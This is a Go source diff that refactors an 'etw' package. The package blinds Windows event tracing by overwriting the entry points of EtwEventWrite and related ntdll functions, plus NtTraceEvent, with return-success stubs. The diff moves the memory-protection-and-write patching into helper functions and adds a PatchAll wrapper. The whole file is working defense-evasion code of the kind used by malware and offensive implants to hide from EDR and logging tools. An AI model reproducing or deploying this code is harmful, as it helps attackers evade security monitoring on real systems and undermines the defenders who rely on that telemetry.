@@ -12,7 +12,6 @@ package etw
 
 import (
 	"fmt"
-	"unsafe"
 
 	"golang.org/x/sys/windows"
 
@@ -21,26 +20,6 @@ import (
 
 // patch is the x64 stub: XOR RAX,RAX; RET — makes function return STATUS_SUCCESS.
 var patch = []byte{0x48, 0x33, 0xC0, 0xC3}
-
-// patchProc overwrites a proc's entry point with the NOP patch.
-func patchProc(proc *windows.LazyProc) error {
-	if err := proc.Find(); err != nil {
-		return fmt.Errorf("find %s: %w", proc.Name, err)
-	}
-	addr := proc.Addr()
-	var oldProtect uint32
-	size := uintptr(len(patch))
-	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
-		return fmt.Errorf("VirtualProtect %s: %w", proc.Name, err)
-	}
-	var written uintptr
-	currentProcess, _ := windows.GetCurrentProcess()
-	if err := windows.WriteProcessMemory(currentProcess, addr, &patch[0], size, &written); err != nil {
-		return fmt.Errorf("WriteProcessMemory %s: %w", proc.Name, err)
-	}
-	windows.VirtualProtect(addr, size, oldProtect, &oldProtect)
-	return nil
-}
 
 // PatchETW patches all 5 ETW event writing functions in ntdll.dll:
 //   - EtwEventWrite
@@ -60,7 +39,7 @@ func PatchETW() error {
 		api.ProcEtwEventWriteTransfer,
 	}
 	for _, proc := range procs {
-		if err := patchProc(proc); err != nil {
+		if err := api.PatchProc(proc, patch); err != nil {
 			return err
 		}
 	}
@@ -74,12 +53,17 @@ func PatchNtTraceEvent() error {
 	if err := proc.Find(); err != nil {
 		return nil // not present
 	}
-	addr := proc.Addr()
-	var oldProtect uint32
-	if err := windows.VirtualProtect(addr, 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
-		return fmt.Errorf("VirtualProtect NtTraceEvent: %w", err)
+	return api.PatchMemory(proc.Addr(), []byte{0xC3})
+}
+
+// PatchAll applies both PatchETW and PatchNtTraceEvent.
+// Returns the first error encountered, or nil if both succeed.
+func PatchAll() error {
+	if err := PatchETW(); err != nil {
+		return fmt.Errorf("PatchETW: %w", err)
 	}
-	*(*byte)(unsafe.Pointer(addr)) = 0xC3 // RET
-	windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
+	if err := PatchNtTraceEvent(); err != nil {
+		return fmt.Errorf("PatchNtTraceEvent: %w", err)
+	}
 	return nil
 }
